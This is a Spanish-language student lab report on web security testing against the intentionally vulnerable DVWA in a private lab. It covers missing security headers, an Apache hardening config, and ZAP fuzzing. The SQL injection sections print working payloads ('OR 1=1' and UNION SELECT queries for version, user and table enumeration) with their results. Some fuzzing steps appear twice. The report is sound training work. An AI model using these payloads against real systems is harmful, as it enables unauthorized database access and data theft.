# Práctica Nro. 5: Web Application Analysis II & SQL Injection (Análisis de Vulnerabilidades en Servicios Web)

## Datos de Identificación

| Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
| :--- | :---: | :---: | :--- |
| Gil, Jesús | 30175126 | 5 | 24-10-2025|
| Guilarte, Andrés | 30246084 | 5 | 24-10-2025 |

**Nombre de la Práctica:** Web Application Analysis II & SQL Injection
(Análisis de Vulnerabilidades en Servicios Web)
 
**Grupo:** 4
_______________________________________

## Objetivos de Aprendizaje

Al finalizar este laboratorio, el estudiante será capaz de:

1. Configurar y operar OWASP ZAP como proxy de interceptación para análisis de tráfico HTTP/HTTPS.  
2. Identificar y documentar encabezados de seguridad faltantes en aplicaciones web.  
3. Ejecutar ataques de fuzzing para detectar vulnerabilidades de inyección SQL.  
4. Realizar auditorías de seguridad en servidores web Apache y Payara Server.  
5. Automatizar la explotación de inyecciones SQL utilizando SQLMap.  
6. Enumerar bases de datos y extraer información sensible de forma controlada.  
7. Generar reportes profesionales de pentesting con hallazgos y recomendaciones.  
8. Aplicar principios éticos en pruebas de penetración controladas. 
_____________________________________

### Recursos Tecnológicos

- 💻 Kali Linux (actualizado, mínimo 4GB RAM)  
- 💻 Metasploitable 2 (configurado en red NAT o Host-Only)  
- 💻 PentesterLab ISO (configurado y accesible)  
- 🌐 Conexión a Internet para actualizaciones  
- 📦 VirtualBox o VMware con configuración de red adecuada
- 🧰 Herramientas: OWASP ZAP, SQLMap, Burp Suite (opcional), navegadores y utilidades de red

________________________________________

## Software Requerido

### Verificar instalaciones necesarias

```bash
which zaproxy      # OWASP ZAP se utilizará para el análisis de encabezados de seguridad en vez de zapproxy
which sqlmap       # SQLMap
which apache2      # Servidor Apache
```

## MÓDULO 1: Análisis de Encabezados de Seguridad con OWASP ZAP
### Objetivos del Módulo

  * Configurar OWASP
  * Analizar encabezados HTTP de respuesta
  * Identificar deficiencias de seguridad en la configuración del servidor
  * Proponer configuraciones de hardening

Los pasos 1 y 3 se realizaron en la práctica anterior; la explicación detallada y las evidencias están en el informe de la Práctica 4. Consulte el informe en GitHub: https://github.com/Jrgil20/PracticasCiberSeguridad/blob/main/Practica4.md/practica4.md

### Paso 2: Iniciar OWASP ZAP

Se inició OWASP ZAP, la herramienta previamente utilizada para el análisis de vulnerabiliadades en la práctica anterior, con las mismas configuraciones que en la práctica anterior.

Se inició OWASP ZAP como proxy de interceptación para capturar y analizar el tráfico HTTP/HTTPS entre el navegador y DVWA.

![ZAP captura](https://imgur.com/7G5ZwRr)

### Pasos 4: y 5 Navegar a DVWA, Capturar Tráfico y Analizar Encabezados de Respuesta

* Se entró a la página web **DVWA** luego de configurar a OWASP ZAP como proxy en la máquina "Analista", toda su expliación y razón en la práctica anterior, ya que esta será como objetivo de los ataques de la práctica.
* **DVWA** es una aplicación web escrita en **PHP/MySQL**, diseñada especificamente para ser vulnerable lo que la hace una herramienta perfecta para pruebas y prácticas del área de la cibereguridad.
* Se usa la URL ```http://192.168.100.20/dvwa/``` ya que al objetivo no tener una dominio público, como por ejemplo dvwa.com, se debe usar directamente la dirección IP del dispotivo objetivo ya que no se puede usar el servicio de DNS para hacer las traducciones necesarias para realizar la comunicación.
* Se configuró en DVWA la opción de "Low" en el panel de DVWA Security para indicarle a la aplicación que no implemente **casi ninguna medidad de seguridad en su código fuente**, esto se hace adecuar el entorno para la realización de los ataques de la práctica.
* Luego de esta configuración, se usó ZAP para monitorear la comunicación entre el cliente y el servidor, se abrió la petición ```GET http://192.168.100.20/dvwa/login.php``` y se abriron los headers corresposdinetes a la respuesta por parte del servidor, abajo de este párrafo se muestra el historial de las petciones visro de ZAP y posterior a la imagen se tiene la respuesta provista por el servidor.

![alt text](https://imgur.com/CU9fSVF)

#### Response del servidor

HTTP/1.1 302 Found

Date: Fri, 10 Oct 2025 16:33:15 GMT

Server: Apache/2.2.8 (Ubuntu) DAV/2

X-Powered-By: PHP/5.2.4-2ubuntu5.10

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0

Pragma: no-cache

Location: index.php

Content-Length: 0

Keep-Alive: timeout=15, max=97

Connection: Keep-Alive

Content-Type: text/html

### PASO 6: Documentar Encabezados Faltantes

Se procederá a documentar los Headers de seguirdad faltantes en la peticióny se clasificarán dependiendo de su importancia para la protección del objetivo.

| # | Encabezado HTTP | Vulnerabilidad Asociada | Impacto | Severidad |
| :---: | :--- | :--- | :--- | :---: |
| 1 | X-Frame-Options | Clickjacking | Un atacante puede cargar la página en un iframe invisible y engañar al usuario para que realice acciones no deseadas | 🔴 Alta |
| 2 | X-Content-Type-Options | MIME Sniffing | El navegador podría interpretar archivos de forma incorrecta, ejecutando código malicioso | 🟡 Media |
| 3 | Content-Security-Policy | XSS, Inyección de código | Sin CSP, la página puede cargar scripts de cualquier origen, facilitando ataques XSS | 🔴 Alta |
| 4 | Strict-Transport-Security | Man-in-the-Middle | Las conexiones pueden ser interceptadas si no se fuerza HTTPS | 🔴 Alta |
| 5 | X-XSS-Protection | Cross-Site Scripting | Desactiva protecciones del navegador contra XSS reflejado | 🟡 Media |

### PASO 7: Proponer Configuraciones de Hardening

Como se puede observar, las petición realizada es sumamente insegura ya que faltan varios headers de seguridad lo que hace que sea un objetvio sencillo para los atacantes al existir varias vulnerabilidades sin mitigar que pueden ser explotadas mediante el uso de sus correspondientes exploits.

En vista de la situación previamente explicada, es necesario modificar el archivo de configuración del servidor web utilizado, Apache 2, para agregarle la configuración de los Headers faltantes para mitigar las vulnerabilidades asociadas con cada Header faltante. Para ello se realizó lo siguiente:
 * Se abrió el archivo de configuración, ubicado en ```/etc/apache2/conf-available/security.conf```, mediante el editor Nano para agregar las configuraciones respectivas.
 * Se agregó lo siguiente al archivo de configuración: 
<details>
<summary>Configuración de encabezados de seguridad (resumida)</summary>

```bash
# ============================================
# CONFIGURACIÓN DE ENCABEZADOS DE SEGURIDAD
# ============================================

# 1. Protección contra Clickjacking
# Impide que la página sea cargada en iframes de otros dominios
Header always set X-Frame-Options "SAMEORIGIN"

# 2. Prevención de MIME Sniffing
# Fuerza al navegador a respetar el Content-Type declarado
Header always set X-Content-Type-Options "nosniff"

# 3. Content Security Policy (CSP)
# Define fuentes confiables para cargar recursos
# Esta configuración permite solo recursos del mismo origen
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'self';"

# 4. HTTP Strict Transport Security (HSTS)
# Fuerza conexiones HTTPS por 1 año (31536000 segundos)
# includeSubDomains: aplica a todos los subdominios
# preload: permite inclusión en listas de precarga de navegadores
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

# 5. Protección XSS del navegador
# Activa el filtro anti-XSS y bloquea la página si detecta un ataque
Header always set X-XSS-Protection "1; mode=block"

# 6. Referrer Policy
# Controla cuánta información se envía en el encabezado Referer
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# 7. Permissions Policy (anteriormente Feature-Policy)
# Deshabilita APIs potencialmente peligrosas
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"

# 8. Ocultar información del servidor (reducir fingerprinting)
ServerTokens Prod
ServerSignature Off
Header unset X-Powered-By
```

</details>

 * Luego de guardar los cambios en el archiv0o, se usaron los comandos ```sudo a2enconf security``` y ```sudo apache2ctl configtest ``` para habilitar la nueva configuración y para verificar que su sintaxis esté correcta, luego de que el segundo comando mostrará el mnesaje de "OK" se precedió a ejecutar el comando ```sudo systemctl restart apache2``` para reiniciar el servicio de Apache 2 pare que se efectuen los cambios.



Después de ejecutar el fuzzer con el payload `1' OR 1=1 #` se analizó la respuesta y no se obtuvo el resultado esperado. Luego se detectó un error en el punto donde se insertaba el payload, por lo que se cambió la ubicación de la inyección y se colocó directamente en el parámetro `id`. A continuación se muestra el campo que solicita el user id en el fuzzer y la petición GET esperada para la verificación en ZAP.

el user id que pide en fuzzer  
![alt text](image-2.png)

Petición GET esperada:
```http
GET http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 192.168.100.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: http://192.168.100.20/dvwa/vulnerabilities/sqli/
Cookie: security=low; PHPSESSID=c0262d9d636d93ae8570fa0233afdeaf
Upgrade-Insecure-Requests: 1
```

✔️ Punto de Verificación: En el panel inferior, pestaña "Request", debe aparecer la petición anterior con el payload insertado en el parámetro `id` (por ejemplo `id=1' OR 1=1 #`) para proceder con el análisis de la respuesta.
Lo anterior está mal. En la imagen siguiente se muestra la forma correcta de insertar el payload en el parámetro id.

Qué estuvo mal
- Se ingresó el payload en el lugar equivocado del fuzzer (campo genérico o cuerpo) en vez de en el parámetro de consulta `id`.
- No se verificó si el cliente o la herramienta estaban codificando/filtrando el payload (comillas/espacios escapados).
- No se comprobó que la petición incluyera los parámetros necesarios (por ejemplo `Submit=Submit`) ni las cookies de sesión (`security=low; PHPSESSID=…`).

En la siguiente imagen se muestra correctamente colocado el payload en el parámetro `id`.


![alt text](image-4.png)

![alt text](image-5.png)

![alt text](image-6.png)

### Iniciar el Fuzzer

- Se hizo clic derecho sobre la petición seleccionada.  
- En el menú contextual se seleccionó Attack → Fuzz...  
- Se abrió la ventana "Fuzzer".

💡 Explicación: El Fuzzer de ZAP permite enviar múltiples variaciones de una petición, reemplazando partes específicas con payloads maliciosos. Esto automatiza el proceso de probar diferentes vectores de ataque.

---

### PASO 5: Configurar el Payload de Fuzzing - Primer Intento (Incorrecto)

Después de ejecutar el fuzzer con el payload `1' OR 1=1 #` se analizó la respuesta y no se obtuvo el resultado esperado.

Qué estuvo mal:
- Se ingresó el payload en el lugar equivocado del fuzzer (campo genérico o cuerpo) en vez de en el parámetro de consulta `id`.  
- No se verificó si el cliente o la herramienta estaban codificando/filtrando el payload (comillas/espacios escapados).  
- No se comprobó que la petición incluyera los parámetros necesarios (por ejemplo `Submit=Submit`) ni las cookies de sesión (`security=low; PHPSESSID=…`).

![fuzzer-errorn](https://imgur.com/gqFL7Cd)

Se detectó el error en el punto donde se insertaba el payload y se cambió la ubicación de la inyección.

---

### PASO 5 (Corregido): Configurar el Payload de Fuzzing Correctamente

1. En la ventana del Fuzzer, en el panel "Request", localizar el parámetro `id=1` en la URL.  
2. Seleccionar únicamente el valor `1` (no el parámetro completo `id=1`).  
3. Hacer clic en el botón "Add..." (a la derecha del panel de Request).

⚠️ Importante: Seleccionar solo el valor que se desea reemplazar, no el nombre del parámetro.  
El valor `1` debe aparecer ahora resaltado.

![Fuzzer corregido](https://imgur.com/ql0egtw)

---

### PASO 6: Añadir Payload de Inyección SQL

1. En la ventana "Payloads", hacer clic en "Add...".  
2. Seleccionar el tipo: "Strings".  
3. En el campo "String", ingresar el payload:

`1' OR 1=1 #`

4. Hacer clic en "Add" y luego en "OK" para cerrar la ventana de payloads.

Explicación del payload:
- `1'` → Cierra la comilla de la consulta original.  
- `OR 1=1` → Condición siempre verdadera.  
- `#` → Comentario en MySQL que ignora el resto de la consulta.

Consulta original esperada:
```sql
SELECT first_name, surname FROM users WHERE user_id = '1';
```
Consulta inyectada:
```sql
SELECT first_name, surname FROM users WHERE user_id = '1' OR 1=1 #';
```
El `#` comenta la comilla final, evitando errores de sintaxis. La condición `OR 1=1` hace que la cláusula WHERE siempre sea verdadera, devolviendo todos los usuarios.

---

### PASO 7: Ejecutar el Fuzzer

- Verificar que el payload esté configurado correctamente.  
- Hacer clic en "Start Fuzzer".

Resultados esperados en la pestaña de resultados del fuzzing:
- State: Successful  
- Code: 200  
- Reason: OK  
- RTT (ms): ~45  
- Size (bytes): ~2847

En lugar de la imagen, enlace al reporte en HTML publicado: [Reporte del fuzzer (HTML publicado)](https://jrgil20.github.io/PracticasCiberSeguridad/Practica5/paylod3.html) — Abra el enlace en el navegador para ver el informe completo en formato HTML.

---

### PASO 8: Analizar la Respuesta del Fuzzing

- En la ventana de resultados del Fuzzer, hacer clic en la petición ejecutada.  
- En el panel inferior, seleccionar la pestaña "Response".  
- Cambiar a la sub-pestaña "Body" para ver el contenido HTML de la respuesta.

En lugar de la imagen, enlace al reporte en HTML publicado: [Reporte del fuzzer (HTML publicado)](https://jrgil20.github.io/PracticasCiberSeguridad/Practica5/paylod4.html) — Abra el enlace en el navegador para ver el informe completo en formato HTML.

Resultado Obtenido (Inyección Exitosa):
- ID: `1' OR 1=1 #` — First name: admin — Surname: admin  
- ID: `1' OR 1=1 #` — First name: Gordon — Surname: Brown  
- ID: `1' OR 1=1 #` — First name: Hack — Surname: Me  
- ID: `1' OR 1=1 #` — First name: Pablo — Surname: Picasso  
- ID: `1' OR 1=1 #` — First name: Bob — Surname: Smith

✅ Confirmación de Vulnerabilidad: La aplicación devolvió TODOS los usuarios de la base de datos en lugar de solo el usuario con ID 1, confirmando que es vulnerable a inyección SQL.

---

### PASO 9: Comparar Respuestas

| Aspecto | Petición Legítima (id=1) | Petición Inyectada (id=1' OR 1=1 #) |
| :--- | :---: | :---: |
| Código HTTP | 200 OK | 200 OK |
| Usuarios devueltos | 1 (admin) | 5 (todos los usuarios) |
| Tamaño de respuesta | ~850 bytes | ~2847 bytes |
| Tiempo de respuesta | ~30 ms | ~45 ms |
| Indicador de vulnerabilidad | ❌ Normal | ✅ VULNERABLE |

Análisis:
- El aumento significativo en el tamaño de la respuesta y la devolución de múltiples usuarios confirman que:
  - La aplicación es vulnerable a inyección SQL.  
  - No existe validación de entrada en el parámetro `id`.  
  - No se utilizan consultas preparadas (prepared statements).  
  - Es posible manipular la lógica de la consulta SQL subyacente.

---

### Explicación Técnica del Payload

Consulta original:
```sql
SELECT first_name, surname FROM users WHERE user_id = '1';
```
Consulta con payload `1' OR 1=1 #`:
```sql
SELECT first_name, surname FROM users WHERE user_id = '1' OR 1=1 #';
```
Desglose:
- `1'` → Cierra la comilla original.  
- `OR 1=1` → Bypass lógico.  
- `#` → Comentario en MySQL que ignora la comilla sobrante.

---

### Payloads Adicionales Probados

| # | Payload | Objetivo | Resultado Obtenido | Estado |
| :---: | :--- | :--- | :--- | :---: |
| 1 | `1' OR '1'='1` | Bypass de autenticación | Devuelve todos los usuarios | ✅ Exitoso |
| 2 | `1' UNION SELECT null, version() #` | Obtener versión de MySQL | Muestra: 5.0.51a-3ubuntu5 | ✅ Exitoso |
| 3 | `1' UNION SELECT null, database() #` | Obtener nombre de la BD | Muestra: dvwa | ✅ Exitoso |
| 4 | `1' UNION SELECT null, user() #` | Obtener usuario de BD | Muestra: root@localhost | ✅ Exitoso |
| 5 | `1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa' #` | Enumerar tablas | Lista: guestbook, users | ✅ Exitoso |

Análisis de Impacto:
- Reconocimiento completo de la infraestructura de base de datos.  
- Identificación de la versión de MySQL (posibles exploits específicos).  
- Enumeración de tablas (objetivo: tabla `users`).  
- Bypass total de autenticación y controles de acceso.
